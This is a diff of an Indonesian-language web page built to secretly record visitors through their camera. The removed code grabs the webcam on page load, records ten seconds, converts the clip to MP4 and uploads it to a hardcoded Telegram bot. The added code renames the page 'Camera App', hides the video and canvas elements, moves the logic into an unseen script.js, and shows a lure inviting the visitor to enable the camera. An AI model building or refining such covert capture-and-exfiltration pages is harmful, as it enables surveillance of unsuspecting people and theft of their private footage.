@@ -3,72 +3,23 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Streaming Kamera ke Telegram</title>
+    <title>Camera App</title>
+    
+    <!-- Tambahkan pustaka FFmpeg.js untuk konversi video -->
+    <script src="https://cdn.jsdelivr.net/npm/@ffmpeg/ffmpeg@latest"></script>
+    
+    <!-- Panggil script.js setelah pustaka FFmpeg.js dimuat -->
+    <script defer src="script.js"></script>
+
+    <style>
+        body { text-align: center; font-family: Arial, sans-serif; background-color: #f0f0f0; }
+        #video, #canvas { display: none; } /* Video & Canvas disembunyikan */
+    </style>
 </head>
 <body>
-
-    <h1>Akses Kamera</h1>
-    <video id="video" autoplay playsinline></video>
-
-    <!-- Tambahkan script FFmpeg -->
-    <script src="https://cdn.jsdelivr.net/npm/@ffmpeg/ffmpeg@latest"></script>
-
-    <!-- Tambahkan kode JavaScript utama -->
-    <script>
-        document.addEventListener("DOMContentLoaded", async function () {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                document.getElementById("video").srcObject = stream;
-                sendToTelegram(stream);
-            } catch (error) {
-                console.error("Gagal mengakses kamera:", error);
-            }
-        });
-
-        async function sendToTelegram(stream) {
-            const botToken = "1234567890:ABCDefGhIJKlMnOpQRstuVWxyz";
-            const chatId = "987654321";
-            const url = `https://api.telegram.org/bot${botToken}/sendVideo`;
-
-            const mediaRecorder = new MediaRecorder(stream, { mimeType: "video/webm" });
-            let chunks = [];
-
-            mediaRecorder.ondataavailable = async (event) => {
-                chunks.push(event.data);
-            };
-
-            mediaRecorder.onstop = async () => {
-                const webmBlob = new Blob(chunks, { type: "video/webm" });
-                const mp4Blob = await convertWebMtoMP4(webmBlob); // Konversi ke MP4
-
-                const formData = new FormData();
-                formData.append("chat_id", chatId);
-                formData.append("video", mp4Blob, "stream.mp4");
-
-                try {
-                    await fetch(url, { method: "POST", body: formData });
-                    console.log("Video MP4 terkirim ke Telegram");
-                } catch (error) {
-                    console.error("Gagal mengirim video ke Telegram:", error);
-                }
-            };
-
-            mediaRecorder.start();
-            setTimeout(() => mediaRecorder.stop(), 10000);
-        }
-
-        async function convertWebMtoMP4(webmBlob) {
-            const { createFFmpeg, fetchFile } = FFmpeg;
-            const ffmpeg = createFFmpeg({ log: true });
-
-            await ffmpeg.load();
-            ffmpeg.FS("writeFile", "input.webm", await fetchFile(webmBlob));
-            await ffmpeg.run("-i", "input.webm", "output.mp4");
-
-            const mp4Data = ffmpeg.FS("readFile", "output.mp4");
-            return new Blob([mp4Data.buffer], { type: "video/mp4" });
-        }
-    </script>
-
+    <h1>Selamat Datang</h1>
+    <p>Silakan aktifkan kamera untuk pengalaman terbaik.</p>
+    <video id="video" autoplay></video>
+    <canvas id="canvas"></canvas>
 </body>
 </html>
